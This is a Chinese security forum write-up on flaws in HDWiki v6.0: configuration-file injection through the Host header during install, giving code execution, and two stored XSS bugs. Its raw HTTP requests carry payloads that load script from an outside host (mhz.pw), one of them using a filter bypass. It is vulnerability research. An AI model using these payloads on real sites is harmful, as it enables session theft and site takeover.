[i春秋核心白帽yanzm](https://bbs.ichunqiu.com/thread-40749-1-1.html?from=beef)

  

0x00 背景

最近拿到一个源码素材于是对这个源码进行分析发现了不少漏洞本篇先将一些漏洞进行分析下一篇再进行GetShell方法的分析期待和师傅们的交流。

0x01 漏洞分析

配置文件写入

0x00 相关环境

源码信息HDWiki-v6.0UTF8-20170209

问题文件 \HDWiki-v6.0UTF8-20170209\hdwiki\install\install.php

漏洞类型配置文件写入导致代码执行

站点地址<http://kaiyuan.hudong.com/>

0x01 漏洞分析

在文件\HDWiki-v6.0UTF8-20170209\hdwiki\install\install.php的第291-310行中发现如下代码块其中传入的数据库连接等信息没有经过安全处理直接拼接然后使用fwrite函数将拼接后的内容写入到配置文件中,因此此处存在代码执行漏洞。

![image.png](https://image.3001.net/images/20180524/15271483364272.png!small)  

通过反向跟踪$configfile,$site_url的数据知道写入文件的名称是config.php,还有$site_url的参数是获取Host头的值。

在\HDWiki-v6.0UTF8-20170209\hdwiki\install\install.php

  
![image.png](https://image.3001.net/images/20180524/15271483428656.png!small)

![image.png](https://image.3001.net/images/20180524/15271483512406.png!small)

  

0x02 漏洞复现

可以写入代码的位置有dbhost,dbuser,dbpassword,dbname,table_prefix,Host这里我直接将代码植入到Host中。进行如下请求将[恶意代码](http://bbs.ichunqiu.com/portal.php)写入到配置文件中由于配置文件没有设置访问权限所以写入后可以直接前台访问。

![image.png](https://image.3001.net/images/20180524/15271483681430.png!small)  

写入后访问config.php 可以直接前台进行代码执行。

![image.png](https://image.3001.net/images/20180524/1527148376283.png!small)

  
![image.png](https://image.3001.net/images/20180524/15271483815328.png!small)  

XSS注入

0x00 相关环境

源码信息HDWiki-v6.0UTF8-20170209

问题文件 \hdwiki\control\user.php

漏洞类型存储型XSS注入

站点地址<http://kaiyuan.hudong.com/>

0x01 漏洞分析

在文件\hdwiki\control\user.php中的第50-56行中发现如下代码块通过分析和数据跟踪发现$email存在安全问题在第54行中接收email的值然后进行引号的转义处理后进入到了第56行中的docheck中。

![image.png](https://image.3001.net/images/20180524/15271483896266.png!small)  

跟入docheck方法在文件\hdwiki\control\user.php中的第199行中使用docheckemail方法对$email进行检测。

  
![image.png](https://image.3001.net/images/20180524/1527148396663.png!small)  

跟入docheckemail方法,在文件\hdwiki\control\user.php中的第254-271行中发现该方法的代码块通过分析该方法的可以知道并没有对HTML或者JS代码/字符进行安全处理所以此处存在存储型XSS。

![image.png](https://image.3001.net/images/20180524/15271484017420.png!small)  

0x02 漏洞复现

由于邮箱的长度有限制但是可以使用短域名突破。

POST /index.php?user-register HTTP/1.1

Host: 127.0.0.1:8081

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101
Firefox/61.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: [url]http://127.0.0.1:8081/index.php?user-register[/url]

Content-Type: application/x-www-form-urlencoded

Content-Length: 143

Cookie: hd_sid=2ny184;
hd_auth=7eecQnwVHW%2FA9biNTw4cASoUikKxWJr4gHY9sz1QoHE50i5%2Bf92UQu6AOs9y1wk0RIqYiuWGCV2mX32jUwwn;
PHPSESSID=14uuv4iobaociig610qksae2v0

Connection: close

Upgrade-Insecure-Requests: 1

username=Thinking&password=Thinking&repassword=Thinking&email=<script
src=http://mhz.pw/G></script>&agree=on&fromuid=&submit=%E6%8F%90%E4%BA%A4

  

当管理员登录后台进行用户管理便会触发JS代码。

1x00 相关环境

源码信息HDWiki-v6.0UTF8-20170209

问题文件\hdwiki\control\doc.php

漏洞类型存储型XSS注入

站点地址<http://kaiyuan.hudong.com/>

1x01 漏洞分析

在文件\hdwiki\control\doc.php中的第413行中发现doedit方法在对词条进行编辑的时候过滤危险字符的函数可以被绕过导致可以直接引入前端代码造成存储型XSS在文件的第534行中使用了stripscript方法对传入的内容进行安全处理。

  
![image.png](https://image.3001.net/images/20180524/15271484213052.png!small)  

跟入stripscript在\hdwiki\lib\string.class.php文件的第227行中发现该方法分析该方法可以知道该方法是将符合$pregfind的正则内容替换为空因此可以通过如下方法进行绕过。

![image.png](https://image.3001.net/images/20180524/15271484286726.png!small)  

绕过方法

  
![image.png](https://image.3001.net/images/20180524/15271484333577.png!small)  

1x02 漏洞复现

首先注册一个用户再创建一个词条然后对词条进行编辑也就是在content参数中植入js代码绕过方法就是在最后一个script后加上空格然后提交。

  
  

POST /index.php?doc-edit HTTP/1.1

Host: 127.0.0.1:8081

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101
Firefox/61.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: [url]http://127.0.0.1:8081/index.php?doc-edit-59[/url]

Content-Type: multipart/form-data;
boundary=---------------------------114782935826962

Content-Length: 1332

Cookie: PHPSESSID=14uuv4iobaociig610qksae2v0; hd_sid=HbPBd8;
hd_auth=0737U4o9dWt5bzx9M%2BcQJZYvE1vO7shf%2Bej%2BpJtLa4eIXyCXC4r7pEHAk1KUQg%2Fh3G8yJtxK1dhL1FuFp1crdw

Connection: close

Upgrade-Insecure-Requests: 1

\-----------------------------114782935826962

Content-Disposition: form-data; name="did"

59

\-----------------------------114782935826962

Content-Disposition: form-data; name="section_id"

\-----------------------------114782935826962

Content-Disposition: form-data; name="create_submit"

1

\-----------------------------114782935826962

Content-Disposition: form-data; name="title"

Thinking test buibui

\-----------------------------114782935826962

Content-Disposition: form-data; name="category"

0

\-----------------------------114782935826962

Content-Disposition: form-data; name="_token"

y5IIiyfoKxH5dcU90S38sG2STGfHqmkF

\-----------------------------114782935826962

Content-Disposition: form-data; name="summary"

xss

\-----------------------------114782935826962

Content-Disposition: form-data; name="content"

<p>hello world!<br /><br /></p><script src=http://mhz.pw/G></script >

\-----------------------------114782935826962

Content-Disposition: form-data; name="tags"

A

\-----------------------------114782935826962

Content-Disposition: form-data; name="code"

\-----------------------------114782935826962

Content-Disposition: form-data; name="editreason[]"

A

\-----------------------------114782935826962

Content-Disposition: form-data; name="publishsubmit"

å‘å¸ƒ

\-----------------------------114782935826962--
  

  

当用户或者管理员访问这个词条后就可以执行JS脚本了。

  
![image.png](https://image.3001.net/images/20180524/15271484543927.png!small)  

![image.png](https://image.3001.net/images/20180524/15271484665428.png!small)  

0x02 小小总结

本篇只分析了发现的部分漏洞该源码的问题不少感兴趣的伙伴们可以自行挖掘试试至于GetShell的方法有好几个后篇再和大家分享吧期待和师傅们的交流讨论师傅们有更好的思路期待能一起交流讨论但是如果是hc请走开勿扰交流学习可联系我。[>>>点击跳转](https://bbs.ichunqiu.com/portal.php?from=beef)

